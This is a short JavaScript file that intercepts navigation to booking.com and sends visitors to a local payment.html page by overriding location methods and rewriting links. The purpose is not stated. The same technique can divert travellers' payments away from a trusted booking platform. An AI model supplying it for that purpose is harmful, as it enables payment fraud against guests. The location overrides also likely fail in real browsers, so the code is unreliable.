// overrideRedirect.js

// Block all redirects to Booking.com and reroute to your own payment page
(function () {
  const redirectToPayment = () => {
    console.log("Redirecting to custom payment page...");
    window.location.href = "payment.html";
  };

  // Intercept and override any redirect attempts to Booking.com
  const originalAssign = window.location.assign;
  const originalReplace = window.location.replace;

  window.location.assign = function (url) {
    if (url.includes("booking.com")) {
      redirectToPayment();
    } else {
      originalAssign.call(window.location, url);
    }
  };

  window.location.replace = function (url) {
    if (url.includes("booking.com")) {
      redirectToPayment();
    } else {
      originalReplace.call(window.location, url);
    }
  };

  // Monitor for direct changes to window.location.href
  Object.defineProperty(window.location, 'href', {
    set: function (url) {
      if (url.includes("booking.com")) {
        redirectToPayment();
      } else {
        window.location.assign(url);
      }
    }
  });

  // Optional: Replace any booking.com <a href> links on the page
  document.addEventListener("DOMContentLoaded", () => {
    const links = document.querySelectorAll("a[href*='booking.com']");
    links.forEach(link => {
      link.href = "payment.html";
    });
  });

})();
